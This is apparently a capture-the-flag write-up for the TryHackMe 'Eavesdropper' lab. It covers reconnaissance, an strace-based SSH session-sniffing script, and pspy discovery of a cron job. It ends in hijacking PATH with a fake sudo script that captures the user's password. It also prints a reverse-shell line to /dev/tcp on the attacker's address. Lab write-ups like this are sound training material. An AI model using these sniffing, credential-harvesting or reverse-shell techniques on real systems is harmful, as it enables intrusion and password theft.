# Eavesdropper

URL: https://tryhackme.com/room/eavesdropper

Level: Medium

Date: 11-12 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
- [Local Enum]
	- [Processes](#processes)
	- [LinPeas](#linpeas)
	- [Pspy](#pspy)
	- [PATH](#path)
	- [Frank password](#frank-password)
- [Privesc](#privesc)
	- [root flag](#root-flag)





## Reconnaissance

### nmap

```bash
# Nmap 7.93 scan initiated Fri Aug 11 16:47:03 2023 as: nmap -T4 -p- -n -oA nmap 10.10.99.150
Nmap scan report for 10.10.99.150
Host is up (0.057s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

# Nmap done at Fri Aug 11 16:48:04 2023 -- 1 IP address (1 host up) scanned in 60.20 seconds
```

```bash
$ sudo nmap -p22 -sC -sV 10.10.84.158
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-12 10:54 CEST
Nmap scan report for 10.10.84.158
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4d1b67084a1900d584d1568cd2ee6bb (RSA)
|   256 aadae41a0128d15d006f3768ec6e86cb (ECDSA)
|_  256 4263906e9f1a8bc4f7bbaa23a25f928f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.35 seconds
```

```bash
$ ssh -i idrsa.id-rsa frank@10.10.84.158
The authenticity of host '10.10.84.158 (10.10.84.158)' can't be established.
ED25519 key fingerprint is SHA256:WaKDmh6WMRiZ/ysLM5UQM/UirbKKHGy+jRJ5euxQS84.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:216: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.84.158' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 12 08:29:40 2023 from 172.18.0.2
frank@workstation:~$
```

## Local Enum

### processes

```bash
frank@workstation:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  1.4  12172  7168 ?        Ss   08:23   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         590  0.6  1.8  13584  8704 ?        Ss   08:29   0:00 sshd: frank [priv]
frank        603  0.0  1.0  13908  5192 ?        S    08:29   0:00 sshd: frank@pts/0
frank        604  0.1  0.8   5992  3888 pts/0    Ss   08:29   0:00 -bash
frank        654  0.0  0.6   7644  3220 pts/0    R+   08:30   0:00 ps aux
```

We noticed multiple SSH connections from another IP on same network:

```bash
frank@workstation:~$ last | head
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
frank    pts/1        172.18.0.2       Sat Aug 12 08:30 - 08:30  (00:00)
```

### linpeas

We run `LinPeas` and we found this interesting technique

```bash
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd: process found (dump creds from memory as root)
```

Tried this:

https://www.infosecmatter.com/ssh-sniffing-ssh-spying-methods-and-defense/

```bash
frank@workstation:~$ cat > script.sh
#!/bin/bash
# By infosecmatter.com

trap 'rm -f -- ${tmpfile}; exit' INT

tmpfile="/tmp/$RANDOM$$$RANDOM"
pgrep -a -f '^ssh ' | while read pid a; do echo "OUTBOUND $a $pid"; done >${tmpfile}
pgrep -a -f '^sshd: .*@' | while read pid a; do
  tty="${a##*@}"
  from="`w | grep ${tty} | awk '{print $3}'`"
  echo "INBOUND $a (from $from) $pid"
done >>${tmpfile}

IFS=$'\n'; select opt in `cat ${tmpfile}`; do
  rm -f -- ${tmpfile}
  pid="${opt##* }"
  wfd="[0-9]"
  rfd="[0-9]"
  strace -e read,write -xx -s 9999999 -p ${pid} 2>&1 | while read -r a; do
    if [[ "${a:0:10}" =~ ^write\(${wfd}, ]] \
    && [ ${#wfd} -le 3 ] \
    && ! [[ "$a" =~ \ =\ 1$ ]]; then
        echo -en "`cut -d'"' -f2 <<<${a}`"
    elif [[ "${a:0:10}" =~ ^read\(${rfd}, ]] \
    && [ ${#rfd} -le 3 ]; then
        echo -en "`cut -d'"' -f2 <<<${a}`"
    elif [[ "$a" =~ ^read\((${rfd}+),.*\ =\ [1-9]$ ]]; then
        fd="${BASH_REMATCH[1]}"
        if [[ "$a" =~ \ =\ 1$ ]]; then
          rfd="$fd"
        fi
    elif [[ "${a:0:10}" =~ ^write\((${wfd}+), ]] \
    && [ ${#wfd} -gt 4 ]; then
        fd="${BASH_REMATCH[1]}"
        if [[ "${a}" =~ \\x00 ]]; then continue; fi
        if [[ "${a}" =~ \ =\ 1$ ]] || [[ "${a}" =~ \"\\x0d\\x0a ]]; then
          wfd="$fd"
        fi
    fi
  done
  echo ">> SSH session ($opt) closed"
  exit 0
done
frank@workstation:~$ chmod +x script.sh
frank@workstation:~$ ./script.sh
1) INBOUND sshd: frank@pts/0 (from 10.8.100.14) 603
#? 1
>> SSH session (INBOUND sshd: frank@pts/0 (from 10.8.100.14) 603) closed
```

No luck.
### pspy

We suspect that there is some cronjob that opens ssh connections.. let's check with `pspy`:

```bash
frank@workstation:~$ wget http://10.8.100.14:8080/pspy/pspy64
--2023-08-12 09:04:17--  http://10.8.100.14:8080/pspy/pspy64
Connecting to 10.8.100.14:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                          100%[=====================================================================================================>]   2.94M  1.33MB/s    in 2.2s

2023-08-12 09:04:19 (1.33 MB/s) - ‘pspy64’ saved [3078592/3078592]

frank@workstation:~$ chmod +x pspy64
frank@workstation:~$ ./pspy64
```

We noticed this:

```bash
2023/08/12 09:04:52 CMD: UID=1000 PID=14101  |
2023/08/12 09:04:52 CMD: UID=1000 PID=14102  | /bin/sh /etc/init.d/ssh status
2023/08/12 09:04:52 CMD: UID=1000 PID=14104  | /bin/sh /usr/sbin/service --status-all
2023/08/12 09:04:52 CMD: UID=1000 PID=14103  | /bin/sh /usr/sbin/service --status-all
2023/08/12 09:04:53 CMD: UID=1000 PID=14105  | sshd: frank@pts/1
2023/08/12 09:04:54 CMD: UID=1000 PID=14106  | sshd: frank@pts/1
2023/08/12 09:04:54 CMD: UID=0    PID=14107  | sudo cat /etc/shadow
```

So there is a cron that executes `sudo cat /etc/shadow`.

Maybe we can abuse `$PATH`

### path

```bash
frank@workstation:~$ env
SHELL=/bin/bash
PWD=/home/frank
LOGNAME=frank
MOTD_SHOWN=pam
HOME=/home/frank
LANG=C.UTF-8
..
..
..
SSH_CONNECTION=10.8.100.14 45132 172.18.0.2 22
TERM=tmux-256color
USER=frank
SHLVL=1
SSH_CLIENT=10.8.100.14 45132 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env

```

```bash
frank@workstation:~$ cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
```

So we can 

```bash
frank@workstation:~$ mkdir -p .local/bin
frank@workstation:~/.local/bin$ cat > asd
#!/bin/bash
echo "asd"
frank@workstation:~/.local/bin$ chmod +x asd
```

```bash
frank@workstation:~$ env
SHELL=/bin/bash
PWD=/home/frank
LOGNAME=frank
MOTD_SHOWN=pam
HOME=/home/frank
LANG=C.UTF-8
..
..
..
SSH_CONNECTION=10.8.100.14 51684 172.18.0.2 22
TERM=xterm
USER=frank
SHLVL=1
SSH_CLIENT=10.8.100.14 51684 22
PATH=/home/frank/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/1
_=/usr/bin/env
frank@workstation:~$ asd
asd
frank@workstation:~$
```

```bash
frank@workstation:~/.local/bin$ cat sudo
#!/bin/bash
sudo bash -i >& /dev/tcp/10.8.100.14/4444 0>&1

frank@workstation:~/.local/bin$ chmod +x sudo
```

Doesn't work, since `sudo`, in our case, requires that someone type the `frank`'s password.

So we can replace official `sudo` binary with a malicious script that reads user input and store value in a variable.

This is the actual `sudo`'s output

```bash
frank@workstation:~$ sudo cat /etc/shadow
[sudo] password for frank:
```

So we use `read` to "fake" the remote connection, that way:

```bash
frank@workstation:~$ cat .local/bin/sudo
#!/bin/bash
read -p "[sudo] password for frank:" password
echo $password > /tmp/pass.txt
frank@workstation:~$ chmod +x .local/bin/sudo
```

...after a while, it seems not working, even if, in another shell, we got the intendend `PATH`:

```bash
frank@workstation:~$ env |grep PATH
PATH=/home/frank/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
frank@workstation:~$ which sudo
/home/frank/.local/bin/sudo
```

Maybe we can "force" the malicious PATH in `.bashrc`:

```bash
frank@workstation:~$ head .bashrc
export PATH=/home/frank/.local/bin:$PATH
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the pa
..
..
..
```

### frank password

We got password!

```bash
frank@workstation:~$ ls /tmp/
pass.txt

```



```bash
frank@workstation:~$ cat /tmp/pass.txt
XXXXXXXXXXXXXXXXXXXXXX
frank@workstation:~$ sudo -l
[sudo] password for frank:
Matching Defaults entries for frank on workstation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on workstation:
    (ALL : ALL) ALL

```

## privesc

### root flag

```bash
root@workstation:/home/frank# cd
root@workstation:~# cat flag.txt
flag{14370XXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```



